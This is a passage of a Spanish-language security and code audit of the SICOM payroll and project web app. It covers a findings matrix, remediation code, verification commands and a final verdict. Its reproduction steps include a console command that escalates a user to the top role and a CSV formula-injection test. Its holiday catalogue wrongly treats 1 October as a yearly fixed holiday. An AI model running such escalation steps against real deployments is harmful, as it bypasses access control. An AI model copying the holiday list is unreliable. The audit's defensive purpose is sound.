## 6. MATRIZ INTEGRAL DE RIESGOS Y HALLAZGOS POR SEVERIDAD

A continuación se consolida la totalidad de los hallazgos identificados en las dimensiones arquitectónica, de seguridad, lógica operativa y responsividad, clasificados por su nivel de severidad técnica y operativa:

| ID | Eje / Dimensión | Severidad | Hallazgo Técnico | Causa Raíz | Ubicación Exacta | Impacto Operativo y Técnico | Propuesta Técnica de Resolución |
|---|---|:---:|---|---|---|---|---|
| **SEC-01** | Seguridad / RBAC | **CRÍTICO** | Escalación trivial de privilegios a perfil "Supremo" desde consola. | `currentUserRole` expuesto con getter/setter público en `window`. | `app.js`: 79-92 | Usuarios con rol "Lector" o "Consultor" pueden tomar control total del sistema y eliminar datos. | Encapsular el estado del usuario en un closure privado dentro de un módulo ESM; eliminar asignación en `window`. |
| **SEC-02** | Seguridad / Integridad | **CRÍTICO** | Sobreescritura total destructiva de la base de datos de producción en Firestore al importar JSON. | `saveData(true)` invoca `setDoc` con `{ merge: false }` sin confirmación ni autenticación criptográfica. | `app.js`: 1561, 8566-8597 | Un archivo de respaldo erróneo o malicioso borra toda la información histórica de la organización en la nube. | Exigir reautenticación con contraseña de supervisor, validar esquema estricto y ejecutar respaldos automáticos previos. |
| **SEC-03** | Seguridad / Credenciales | **CRÍTICO** | Hashes SHA-256 no salados expuestos públicamente y contraseñas en texto claro. | `ROLE_PASSWORD_HASHES` codificado en duro en JS del cliente; auth anónima compartida. | `app.js`: 163, 720-725, 754-758 | Compromiso inmediato de credenciales mediante tablas Rainbow; imposibilidad de auditar usuarios en Firestore. | Migrar a Firebase Authentication con cuentas reales por usuario y Custom Claims (`claims.role = 'Supremo'`). |
| **LOG-01** | Lógica ERP / Legal | **CRÍTICO** | Incumplimiento de la reforma laboral de "Vacaciones Dignas" (Art. 76 LFT). | Saldos estáticos cableados (4-10 días); la fecha de ingreso `hireDate` no interviene en ningún cálculo. | `app.js`: 42-55, 5235, 5325 | Violación de la legislación laboral federal; privación ilegal de hasta 20 días de descanso a empleados senior. | Implementar el algoritmo oficial del Art. 76 LFT calculado dinámicamente a partir de `hireDate` y la fecha actual. |
| **LOG-02** | Lógica ERP / Integridad | **CRÍTICO** | Decremento destructivo sobre saldos vacacionales y sobregiros permitidos sin reversibilidad. | Se muta directamente el entero `pendingVacations`; `Math.max(0)` previene negativos pero autoriza sobregiros. | `app.js`: 11946-11950, 12038-12042 | Pérdida de días por captura errónea; falta de trazabilidad y ausencia de restitución al eliminar solicitudes. | Crear una entidad contable de movimientos (`vacationLedger`) con historial inmutable y validación de saldo previo. |
| **LOG-03** | Lógica ERP / Nómina | **CRÍTICO** | Omisión de días festivos oficiales LFT; descuento indebido de días de descanso obligatorio. | Cálculo de días hábiles restringido a `dow !== 0 && dow !== 6` sin catálogo del Art. 74 LFT. | `app.js`: 11590, 11801, 11929, 12007 | Deducción ilegal de festivos sobre saldos de vacaciones; prenóminas emitidas con días laborables incorrectos. | Incorporar catálogo de días festivos oficiales federales y excluir días de descanso obligatorio del descuento vacacional. |
| **LOG-04** | Lógica ERP / Auditoría | **CRÍTICO** | Truncamiento destructivo de la bitácora a 250 registros y exclusión de asistencia/nómina. | `appData.history.length = 250` destruye historial previo; módulos de nómina no invocan `logActivity`. | `app.js`: 250-264 | Pérdida irreparable de evidencia operativa y legal; vulnerabilidad ante reclamos de trabajadores o auditorías. | Eliminar truncamiento a 250 en almacenamiento local, persistir bitácora en Firestore y auditar todo cambio de celda. |
| **ARQ-01** | Arquitectura / Código | **ALTO** | Monolito de 12,414 líneas con 275 variables de módulo compartidas y 332 asignaciones a `window`. | Acumulación procedimental de código en un solo archivo sin fronteras modulares. | `app.js`: 8-45, 77-93 | Altísimo riesgo de regresión en cada despliegue; acoplamiento extremo; imposibilidad de pruebas unitarias. | Modularizar en ES Modules nativos (`js/core/`, `js/mindmap/`, `js/modules/`, `js/ui/`) con Store desacoplado. |
| **PERF-01** | Rendimiento / DOM | **ALTO** | Pulverización del árbol SVG en cada interacción (`canvasGroup.innerHTML = ''`) y Layout Thrashing. | Ausencia de DocumentFragment; reflows forzados sincrónicos con `getBoundingClientRect` en touchmove. | `app.js`: 2444, 6062, 6361 | Caídas severas de cuadros por segundo (lag táctil e interactivo) en sesiones de trabajo y dispositivos móviles. | Utilizar `DocumentFragment` y `replaceChildren()`; cachear dimensiones del SVG para evitar reflows continuos. |
| **PERF-02** | Rendimiento / Memoria | **ALTO** | Listeners individuales registrados dentro de bucles SVG y bucles rAF concurrentes compitiendo. | Falta de delegación de eventos en el SVG; múltiples funciones `stepCorePath` invocadas en paralelo. | `app.js`: 6780-6791, 7047, 7476, 7618 | Fugas de memoria progresivas (Memory Creep) y pausas por recolección de basura tras uso prolongado. | Implementar un único listener delegado en el contenedor `<svg>`; cancelar bucles rAF previos antes de reanimar. |
| **SEC-04** | Seguridad / Inyección | **ALTO** | Vulnerabilidades XSS en manejadores inline y enlaces arbitrarios con `javascript:`. | Doble descodificación de `escapeHtml` en atributos `onclick`; asignación directa de URLs a `.href`. | `app.js`: 4049, 4130, 8029, 9187 | Ejecución remota de scripts maliciosos en el navegador del operador; robo de credenciales y datos. | Migrar a delegación de eventos con `data-*`; validar que las URLs inicien obligatoriamente con `https://`. |
| **SEC-05** | Seguridad / Inyección | **ALTO** | Vulnerabilidad de Inyección de Fórmulas en exportación de reportes CSV (CWE-1236). | Concatenación directa de strings sin escapar caracteres ejecutables (`=`, `+`, `-`, `@`). | `app.js`: 8535-8544 | Ejecución de comandos del sistema operativo al abrir el archivo CSV en Microsoft Excel o LibreOffice. | Anteponer un apóstrofe `'` a celdas que inicien con caracteres de fórmula y duplicar comillas dobles. |
| **SEC-06** | Seguridad / Persistencia| **ALTO** | Silenciamiento de `QuotaExceededError` en `localStorage` y colapso por JSON corrupto. | `catch (e) {}` vacío al guardar en almacenamiento de 5 MB; `JSON.parse` sin `try-catch` en arranque. | `app.js`: 577, 1553-1557 | Pérdida silenciosa de capturas durante la jornada de trabajo; bloqueo total de la pantalla en blanco (DoS). | Capturar la excepción de cuota emitiendo alerta crítica; envolver `JSON.parse` con autorecuperación. |
| **EST-01** | Estilos / PWA | **MEDIO / CRÍTICO PWA** | Uso del script de desarrollo Tailwind Play CDN en producción e invalidación por `:has()`. | Inclusión de `https://cdn.tailwindcss.com`; selectores `:has()` universales sobre la etiqueta `body`. | `index.html`: 14; `styles.css`: 736-766 | Rompe el funcionamiento fuera de línea de la PWA si no hay internet; compilación continua en el cliente. | Sustituir CDN por Tailwind CLI compilado estático (~40 KB) y migrar selectores `:has` a clases semánticas. |
| **LOG-05** | Lógica ERP / Avance | **MEDIO** | Distorsión del avance documental por documentos N/A y sobrescritura manual por slider. | Fórmula plana `100 / N` suma N/A como completados; slider interactivo permite pisar el porcentaje. | `app.js`: 4150-4162, 4214-4215 | Proyectos sin trabajo reportan avances irreales superiores al 70%; falta de confiabilidad en KPIs de entrega. | Excluir documentos N/A del divisor porcentual; desacoplar el cálculo documental del slider de estimación. |
| **LOG-06** | Lógica ERP / Formatos | **MEDIO** | Esquema híbrido programado por nombres de personas; formato Excel emite celdas en blanco. | Condiciones `name.includes(...)` hardcodeadas; código `code: ''` deja la celda vacía tanto en Home Office como STGT. | `app.js`: 10458-10507, 12197-12204 | Imposibilidad de configurar esquemas híbridos dinámicos; incumplimiento de comprobación NOM-037 ante auditorías. | Configurar esquema híbrido en el perfil de cada colaborador; emitir códigos legibles (`HO` y `STGT`) en el Excel. |
| **LOG-07** | Lógica ERP / Operaciones| **MEDIO** | Bloqueo arbitrario de comisiones en fines de semana y asignación predeterminada a AFR. | Validación rechaza sábado/domingo; fallback automático al cliente 'Autobuses Flecha Roja'. | `app.js`: 11739-11758, 11801-11835 | Imposibilidad de capturar Prima Dominical (`PD`) o Descanso Trabajado (`DT`); distorsión contable hacia AFR. | Permitir comisiones en fin de semana con códigos `PD`/`DT`; exigir selección obligatoria del cliente sin fallback. |
| **LOG-08** | Lógica ERP / Tareas | **MEDIO** | Pérdida irreversible de evidencia técnica al rechazar tareas y bypass desde el Dashboard. | `delete t.feedback` borra los comentarios del consultor; botón del dashboard conmuta `task.done` directamente. | `app.js`: 3760, 8041, 8937 | Desmotivación del equipo técnico al perder observaciones; evasión del flujo de supervisión de calidad. | Preservar historial de feedback en un arreglo cronológico; restringir cambios desde el dashboard al flujo de validación. |
| **SEC-07** | Seguridad / Secretos | **MEDIO** | Llave privada VAPID y Webhooks de Google Chat expuestos en código fuente. | Secretos embebidos en `api/push.js` y `Code.gs` como valores de respaldo o concatenaciones. | `api/push.js`: 3-4; `Code.gs`: 8-12 | Envío de notificaciones WebPush apócrifas; intrusión en salas de chat internas de la compañía. | Mover todas las llaves a variables de entorno de servidor en Vercel y Google Apps Script Properties. |
| **SEC-08** | Seguridad / Cabeceras | **MEDIO** | Ausencia total de cabeceras Content Security Policy (CSP). | Omisión de directivas CSP en las configuraciones de `_headers` y `vercel.json`. | `_headers`: 1-13; `vercel.json`: 16-24 | Permite la inyección y ejecución de scripts externos o en línea no autorizados en el navegador. | Implementar cabecera `Content-Security-Policy` estricta restringiendo fuentes de scripts y conexiones. |

---

## 7. PLAN DE ACCIÓN Y RUTA DE OPTIMIZACIÓN PRIORIZADA

Para guiar la remediación técnica del sistema con máxima eficiencia operativa y respetando de manera absoluta la restricción tecnológica de **preservar Vanilla JavaScript + Tailwind CSS**, se estructura el plan de trabajo en dos fases estratégicas:

```
                                CRONOGRAMA DE REMEDIACIÓN
  ┌────────────────────────────────────────────────────────────────────────────────────────┐
  │ FASE 1: QUICK WINS (Semanas 1 - 2)                                                     │
  │ • Mitigación de Vulnerabilidades Críticas de Seguridad Inmediata (SEC-01, SEC-02)      │
  │ • Corrección de Fórmulas Legales de Vacaciones LFT y Días Festivos (LOG-01, LOG-03)   │
  │ • Protección de Fórmulas CSV y Manejo de Cuotas de Almacenamiento (SEC-05, SEC-06)     │
  │ • Reemplazo del Tailwind Play CDN por Tailwind CLI Compilado (EST-01)                  │
  └────────────────────────────────────────────────────────────────────────────────────────┘
                                            │
                                            ▼
  ┌────────────────────────────────────────────────────────────────────────────────────────┐
  │ FASE 2: MEJORAS ESTRUCTURALES A MEDIANO PLAZO (Semanas 3 - 6)                          │
  │ • Modularización Completa en ES Modules Nativos (Vanilla JS) (ARQ-01)                  │
  │ • Migración del Modelo de Persistencia a IndexedDB con Transacciones (SEC-06)         │
  │ • Implementación de Firebase Auth con Cuentas Reales y Custom Claims (SEC-03)          │
  │ • Libro Mayor Contable de Vacaciones (VacationLedger) y Ponderación de Docs (LOG-02)   │
  │ • Optimización de Renderizado SVG con DocumentFragment y Event Delegation (PERF-01)    │
  └────────────────────────────────────────────────────────────────────────────────────────┘
```

### 7.1 Fase 1: Acciones Inmediatas ("Quick Wins" - Alto Impacto / Bajo Esfuerzo)

Estas acciones pueden implementarse directamente en los archivos actuales sin requerir una reestructuración completa del sistema:

#### Quick Win 1: Bloqueo de Escalación de Privilegios en Consola (SEC-01)
- **Acción:** Eliminar `Object.defineProperty(window, 'currentUserRole', ...)` y `window.currentUserRole` en las líneas 79-93 de `app.js`.
- **Implementación:** Mantener `currentUserRole` como variable léxica interna del módulo y exponer únicamente una función de solo lectura inmutable `window.getCurrentUserRole = () => String(currentUserRole)`.

#### Quick Win 2: Protección contra Inyección de Fórmulas en CSV (SEC-05)
- **Acción:** En `app.js` (línea 8536), sanear los campos antes de concatenarlos en el string CSV.
- **Implementación Técnica Blindada:**
  ```javascript
  const sanitizeCsvCell = (val) => {
      if (val === undefined || val === null) return '""';
      const str = String(val);
      const trimmed = str.trimStart();
      
      // Si es un número escalar válido (incluso negativo como -15.5), se exporta sin apóstrofe para evitar corrupción contable
      if (!isNaN(Number(trimmed)) && !trimmed.includes('\n')) {
          return '"' + str.replace(/"/g, '""') + '"';
      }
      
      // Si contiene caracteres de ejecución al inicio (incluyendo espacios o saltos de línea previos)
      if (/^[=\+\-@\t\r\n]/.test(trimmed)) {
          return '"\'' + str.replace(/"/g, '""') + '"';
      }
      return '"' + str.replace(/"/g, '""') + '"';
  };
  ```
  *Ventajas del diseño blindado:*
  1. **Prevención de evasiones:** `str.trimStart()` y la inclusión de `\n` en `/^[=\+\-@\t\r\n]/` neutralizan vectores que anteponen espacios o saltos de línea para eludir filtros convencionales.
  2. **Integridad financiera:** Evita prefijar apóstrofe a números negativos escalares legítimos (e.g. `-15.5`), asegurando que Excel y Calc los reconozcan como números para funciones contables (`=SUM()`, `=AVERAGE()`).
  3. **Cumplimiento RFC 4180:** Duplica comillas internas (`""`) y delimita uniformemente el contenido.

#### Quick Win 3: Mitigación de Pérdida de Datos y Detección de Cuota en LocalStorage (SEC-06)
- **Acción:** En `app.js` (líneas 1553-1557), reemplazar el `catch (e) {}` vacío por un manejador de excepciones visible y seguro.
- **Implementación:**
  ```javascript
  try {
      localStorage.setItem('sicom_data', JSON.stringify(appData));
      localStorage.setItem('sicom_consultants', JSON.stringify(consultants));
      localStorage.setItem('sicom_global_docs', JSON.stringify(globalDocs));
  } catch (err) {
      console.error("Fallo crítico de almacenamiento:", err);
      if (err.name === 'QuotaExceededError' || err.code === 22) {
          window.showToast("⚠️ ALERTA CRÍTICA: Límite de almacenamiento local alcanzado (5MB). No se guardaron los últimos cambios.", true);
      }
  }
  ```
  Y en `loadLocalFallback` (línea 577), envolver `JSON.parse` en un bloque `try-catch` con respaldo automático ante cadenas corruptas.

#### Quick Win 4: Implementación del Motor de Cálculo de Vacaciones Dignas LFT (LOG-01)
- **Acción:** En `app.js`, crear la función de cálculo legal automático y vincularla a la fecha de ingreso `hireDate`.
- **Implementación Técnica Blindada:**
  ```javascript
  window.calculateLftVacationDays = function(hireDateStr, targetDate = new Date()) {
      if (!hireDateStr || typeof hireDateStr !== 'string') return 0; // Evita premiar omisiones con 12 días
      const parts = hireDateStr.trim().replace(/\//g, '-').split('-');
      if (parts.length < 3) return 0;
      const [y, m, d] = parts.map(Number);
      if (isNaN(y) || isNaN(m) || isNaN(d)) return 0;

      const hireDate = new Date(y, m - 1, d);
      let years = targetDate.getFullYear() - hireDate.getFullYear();
      const mDiff = targetDate.getMonth() - hireDate.getMonth();
      
      // Ajuste civil para contratados el 29 de febrero en años comunes
      const isLeapHire = (m === 2 && d === 29);
      const targetIsFebEnd = (targetDate.getMonth() === 1 && targetDate.getDate() >= 28);
      const hasMetAnniversary = (mDiff > 0) || (mDiff === 0 && (targetDate.getDate() >= d || (isLeapHire && targetIsFebEnd)));
      
      if (!hasMetAnniversary) years--;
      if (years < 1) return 0; // Menor a 1 año cumplido: 0 días por ley
      if (years === 1) return 12;
      if (years === 2) return 14;
      if (years === 3) return 16;
      if (years === 4) return 18;
      if (years === 5) return 20;
      // Progresión quinquenal oficial (Art. 76 LFT): 6-10 años = 22 días; 11-15 = 24 días; 16-20 = 26 días...
      return 22 + Math.floor((years - 6) / 5) * 2;
  };
  ```
  *Ventajas del diseño blindado:*
  1. **Tolerancia a datos incompletos:** Retorna `0` en lugar de asignar 12 días por defecto a colaboradores sin registro de contratación, garantizando equidad frente a empleados con menos de un año cumplido.
  2. **Normalización de formatos:** Admite fechas con guiones (`2020-06-15`) y diagonales (`2020/06/15`), eliminando retornos erróneos de tipo `NaN`.
  3. **Manejo de años bisiestos:** Resuelve el aniversario legal para contratados el 29 de febrero evaluados el 28 de febrero en años comunes.
  4. **Conformidad estricta con el Art. 76 LFT:** Aplica la escala legal exacta tras la reforma de "Vacaciones Dignas" (DOF 27/12/2022).

#### Quick Win 5: Integración del Catálogo de Días Festivos Oficiales LFT (LOG-03)
- **Acción:** Definir la lista de días festivos oficiales de descanso obligatorio conforme al Art. 74 de la LFT y excluir automáticamente estas fechas en el cálculo de días hábiles de asistencia y deducción de vacaciones:
  ```javascript
  const LFT_HOLIDAYS_FIXED = ['01-01', '05-01', '09-16', '10-01', '12-25'];
  window.isOfficialHoliday = function(dateObj) {
      const m = String(dateObj.getMonth() + 1).padStart(2, '0');
      const d = String(dateObj.getDate()).padStart(2, '0');
      const key = `${m}-${d}`;
      if (LFT_HOLIDAYS_FIXED.includes(key)) return true;
      // Festivos puente oficiales: 1er lunes de febrero, 3er lunes de marzo, 3er lunes de noviembre
      const dow = dateObj.getDay(); // 1 = Lunes
      const dayNum = dateObj.getDate();
      if (dow === 1) {
          if (m === '02' && dayNum <= 7) return true; // Primer lunes de febrero (Constitución)
          if (m === '03' && dayNum >= 15 && dayNum <= 21) return true; // Tercer lunes de marzo (Benito Juárez)
          if (m === '11' && dayNum >= 15 && dayNum <= 21) return true; // Tercer lunes de noviembre (Revolución)
      }
      return false;
  };
  ```

#### Quick Win 6: Sustitución de Tailwind Play CDN por Tailwind CLI Estático (EST-01)
- **Acción:** Eliminar la línea 14 de `index.html` y generar el archivo `styles.css` minificado mediante Tailwind CLI en la estación de trabajo. Registrar el archivo generado en `sw.js` para asegurar funcionamiento offline absoluto.

---

### 7.2 Fase 2: Mejoras Estructurales a Mediano Plazo

#### Estructural 1: Modularización en ES Modules Nativos (Vanilla JS)
Descomponer el monolito `app.js` en los subsistemas presentados en la Sección 2.6 (`js/core/`, `js/mindmap/`, `js/modules/`, `js/ui/`). Cada módulo importará estrictamente las funciones requeridas mediante sentencias `import` y se comunicará con el resto del sistema a través del gestor de estado centralizado (`store.js`), erradicando las 332 referencias a `window.*`.
- **Estrategia de Coexistencia con Librerías Vendor UMD:** Dado que `xlsx.full.min.js`, `jszip.min.js` y `Chart.js` son librerías empaquetadas en UMD y no pueden importarse directamente con `import` en ESM nativo sin herramientas de bundling, se establece una estrategia dual: (1) Cargar los scripts vendor mediante `<script src="vendor/...">` en `index.html` previo a la carga de `js/main.js`, consumiéndolos a través de shims delgados ESM en `js/vendor/` (`export const XLSX = window.XLSX; export const JSZip = window.JSZip;`), o (2) Descargar sus compilaciones oficiales nativas en formato `.mjs`.
- **Regla Arquitectónica Anti-Ciclos y Prevención de TDZ:** Se prohíbe taxativamente la importación directa cruzada entre módulos de vista, ventanas modales y drawers (`attendanceViews.js` ↔ `commissions.js`). Toda comunicación, notificación y refresco entre componentes UI debe canalizarse exclusivamente mediante el patrón reactivo unidireccional `Store` / Pub/Sub (`store.setState()`, `store.subscribe()`). Esto previene de raíz excepciones fatales de tipo `ReferenceError: Cannot access 'X' before initialization` por Temporal Dead Zone (TDZ).

#### Estructural 2: Migración del Almacenamiento a IndexedDB
Reemplazar `localStorage` por `window.indexedDB` mediante una envoltura transaccional Vanilla JS:
- Capacidad de almacenamiento ampliada a más de 250 MB por dominio.
- Operaciones asíncronas que no bloquean el hilo principal de la interfaz gráfica.
- Almacenamiento estructurado de objetos nativos sin requerir serializaciones continuas mediante `JSON.stringify`.

#### Estructural 3: Autenticación Segura y Autorización Real con Firebase
- Eliminar `signInAnonymously(auth)` en `app.js`.
- Configurar Firebase Authentication con correo y contraseña corporativos.
- Definir roles mediante Firebase Custom Claims (`admin`, `supervisor`, `consultor`, `lector`).
- Escribir e implementar reglas de seguridad en la consola de Firebase (`firestore.rules`):
  ```
  rules_version = '2';
  service cloud.firestore {
    match /databases/{database}/documents {
      match /artifacts/sicom-stgt/public/data/sicom_state/main {
        allow read: if request.auth != null;
        allow write: if request.auth != null && 
          (request.auth.token.role == 'Supremo' || request.auth.token.role == 'Supervisor');
      }
    }
  }
  ```

#### Estructural 4: Implementación del Libro Mayor de Vacaciones (`VacationLedger`)
Crear una estructura contable de partidas dobles para la gestión de vacaciones:
```javascript
// Estructura de registro en vacationLedger
{
    id: "mov_20261019_001",
    consultantId: "Emmanuel Sánchez",
    timestamp: "2026-10-19T10:00:00Z",
    type: "DEDUCTION", // "ACCRUAL" (abono anual), "DEDUCTION" (solicitud), "REVERSAL" (cancelación)
    days: 3,
    periodCovered: { start: "2026-10-21", end: "2026-10-23" },
    previousBalance: 22,
    newBalance: 19,
    authorizedBy: "Supervisor Operativo",
    evidenceTicket: "TK-2026-441"
}
```
Esto garantiza trazabilidad total, impide sobregiros y permite revertir automáticamente los días si una quincena o solicitud se cancela.

#### Estructural 5: Reconciliación Gráfica con DocumentFragment y Event Delegation
Refactorizar el módulo `renderMindMap` para eliminar `canvasGroup.innerHTML = ''`, aplicando delegación de eventos centralizada en el contenedor `<svg>` y construyendo los grafos fuera del árbol vivo con `DocumentFragment`, asegurando una tasa de refresco constante de 60 FPS en equipos de escritorio y móviles.

#### Estructural 6: Despliegue de Cabecera Content Security Policy (CSP) Blindada y Operativa (SEC-08)
Para mitigar la inyección de scripts no autorizados (XSS) y proteger los canales de comunicación sin romper el funcionamiento diario del sistema, se debe incorporar la cabecera `Content-Security-Policy` tanto en la configuración de `_headers` (para Cloudflare / Netlify) como en `vercel.json` (líneas 16-24):

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://www.gstatic.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https:; connect-src 'self' blob: https://firestore.googleapis.com https://identitytoolkit.googleapis.com https://securetoken.googleapis.com https://chat.googleapis.com https://discord.com https://hooks.slack.com; worker-src 'self' blob:;
```

**Justificación Operativa y Mapeo de Orígenes:**
1. **Google Chat Webhook (`https://chat.googleapis.com`):** Invocado en `app.js` (línea 3154) para el envío de notificaciones de comisiones, recordatorios de asistencia y reportes operativos. Su presencia en `connect-src` es indispensable para evitar bloqueos del navegador.
2. **Webhooks Externos (`https://discord.com`, `https://hooks.slack.com`):** Invocados en `app.js` (línea 3193) para el despacho de alertas a canales de supervisión técnica.
3. **Renovación Continua de Tokens de Firebase (`https://securetoken.googleapis.com`):** Requerido por el SDK de Firebase Authentication para refrescar automáticamente el token de acceso tras cada 60 minutos de sesión. Si se omite, los usuarios sufren desconexión y pérdida de permisos tras una hora.
4. **Esquema `blob:` en `connect-src` y `worker-src`:** Requerido por los generadores de respaldos CSV (`app.js`: 8543) y exportación XLSX (`app.js`: 12231) que emplean `URL.createObjectURL(blob)`, así como para la ejecución de workers en segundo plano.
5. **Fuentes Estáticas y CDNs Transicionales:** Autoriza los recursos requeridos en tiempo de ejecución mientras se completa la migración estática de Tailwind y dependencias locales.

---

## 8. GUÍA DE VERIFICACIÓN INDEPENDIENTE Y REPRODUCIBILIDAD

Para que cualquier auditor externo o equipo de ingeniería pueda constatar empíricamente la veracidad de cada hallazgo reportado en este documento, se detallan los procedimientos de verificación técnica paso a paso:

### Procedimiento 1: Verificación de Métricas del Código Fuente
Ejecutar en la terminal PowerShell en el directorio raíz del proyecto:
```powershell
# Verificar líneas reales de app.js e index.html
[IO.File]::ReadAllLines('app.js').Length
[IO.File]::ReadAllLines('index.html').Length

# Verificar cantidad de asignaciones a window.* en app.js
(Select-String -Path .\app.js -Pattern 'window\.[a-zA-Z0-9_]+\s*=').Count

# Verificar cantidad de manipulaciones directas de innerHTML
(Select-String -Path .\app.js -Pattern '\.innerHTML\s*=').Count

# Verificar clases con valores hexadecimales arbitrarios
(Select-String -Path .\app.js -Pattern '\[#[0-9a-fA-F]{6}\]').Count
```
*Resultados esperados de verificación:* 12,414 líneas en `app.js`, 2,371 líneas (208.9 KB / 204 KiB) en `index.html`, 88 líneas (2.8 KB) en `sw.js`, 332 asignaciones a `window.*`, 139 manipulaciones de `innerHTML` y más de 1,350 clases arbitrarias.

### Procedimiento 2: Reproducción de Escalación de Privilegios (SEC-01)
1. Abrir el sistema en Google Chrome o Microsoft Edge.
2. Iniciar sesión seleccionando el perfil de prueba `Consultor` o `Lector`.
3. Constatar que los botones de borrado y menús de configuración administrativa están deshabilitados u ocultos.
4. Abrir la consola de DevTools (F12) y ejecutar:
   ```javascript
   console.log("Rol activo antes:", currentUserRole);
   window.currentUserRole = 'Supremo';
   console.log("Rol activo después:", currentUserRole);
   ```
5. *Resultado esperado:* La variable interna se actualiza instantáneamente a `'Supremo'`. Las funciones administrativas restringidas quedan inmediatamente operativas en el cliente.

### Procedimiento 3: Reproducción de Inyección de Fórmulas CSV (SEC-05)
1. En la ficha técnica de cualquier proyecto, editar el nombre asignando el siguiente valor:
   ```
   =2+5
   ```
2. Pulsar en el botón "Exportar CSV" (`exportCSV`).
3. Abrir el archivo `.csv` descargado en un editor de texto plano (Notepad) o en Microsoft Excel.
4. *Resultado esperado:* En el editor de texto se observa `"","","","=2+5",...` sin ningún carácter de escape. En Excel, la celda se evalúa automáticamente mostrando el resultado matemático `7`, confirmando la vulnerabilidad de inyección ejecutable (CWE-1236).

### Procedimiento 4: Reproducción de Pérdida Silenciosa por Cuota de LocalStorage (SEC-06)
1. Abrir la consola de DevTools en la pestaña de SICOM.
2. Ejecutar la siguiente instrucción para saturar la cuota de almacenamiento:
   ```javascript
   try {
       localStorage.setItem('saturacion_prueba', 'A'.repeat(5 * 1024 * 1024));
   } catch(e) {
       console.warn("Excepción capturada:", e.name);
   }
   ```
3. Intentar modificar el estatus de un proyecto o registrar una nota en la aplicación.
4. Inspeccionar la consola y el comportamiento visual.
5. *Resultado esperado:* La interfaz muestra "Cambios guardados", pero la consola no emite advertencias debido al bloque `catch (e) {}` de la línea 1557. Al recargar la página (F5), los cambios realizados se habrán perdido por completo.

### Procedimiento 5: Inspección de Vulnerabilidades Legales en Vacaciones (LOG-01)
Ejecutar en la terminal PowerShell:
```powershell
Select-String -Path .\app.js -Pattern "pendingVacations" -Context 1,2
Select-String -Path .\app.js -Pattern "defaultConsultantMetadata" -Context 0,15
```
*Resultado esperado:* Confirmación de los saldos estáticos en las líneas 42 a 55, donde colaboradores con más de 10 años de antigüedad tienen asignados 4 o 7 días en lugar de los 22 o 24 días que estipula la LFT.

---

## 9. DICTAMEN FINAL Y RECOMENDACIONES DE GOBERNANZA

### Dictamen Conclusivo de Auditoría
El sistema **SICOM** demuestra una concepción funcional ambiciosa y una estética visual moderna orientada a la productividad operativa. Sin embargo, en su estado actual, **NO CUMPLE con los estándares mínimos de confiabilidad, seguridad criptográfica ni legalidad laboral para operar como sistema de control de nómina y proyectos de misión crítica**.

Las fallas identificadas exponen a la organización a tres riesgos de impacto severo:
1. **Riesgo Legal y Laboral:** Reclamaciones formales y sanciones ante la Procuraduría Federal de la Defensa del Trabajo (PROFEDET) o inspecciones de la STPS por el incumplimiento de la reforma de Vacaciones Dignas y la falta de diferenciación comprobable de teletrabajo (NOM-037).
2. **Riesgo Operativo y de Disponibilidad:** Pérdida permanente de información de asistencia o proyectos por desbordamiento de `localStorage` o sobreescritura accidental de la base de datos de producción durante la importación de respaldos.
3. **Riesgo de Seguridad e Intrusión:** Manipulación no autorizada de datos, autorizaciones fraudulentas de asistencia y posible robo de información por inyección de código ante la ausencia de fronteras de confianza en el servidor.

### Recomendaciones de Gobernanza Técnica
1. **Pase a Producción Condicionado:** Suspender cualquier despliegue de nuevas funcionalidades de negocio hasta que se hayan solventado en su totalidad los hallazgos catalogados como **CRÍTICOS** en la Fase 1 del Plan de Acción.
2. **Adopción de Pruebas Automatizadas:** Establecer una suite básica de pruebas unitarias (utilizando un test-runner ligero compatible con ESM nativo como Node Test Runner) que certifique matemáticamente las fórmulas de vacaciones, días hábiles, festivos oficiales y cálculo de avance documental.
3. **Control de Cambios y Versionado:** Configurar ramas protegidas en el repositorio de código fuente, eliminando de forma definitiva la práctica de exponer secretos o credenciales directamente en los scripts estáticos.

---
*Fin del Dictamen de Auditoría Técnica 360° - SICOM.*  
*Emitido por el equipo de Auditoría e Ingeniería de Software - 19 de Octubre de 2026.*
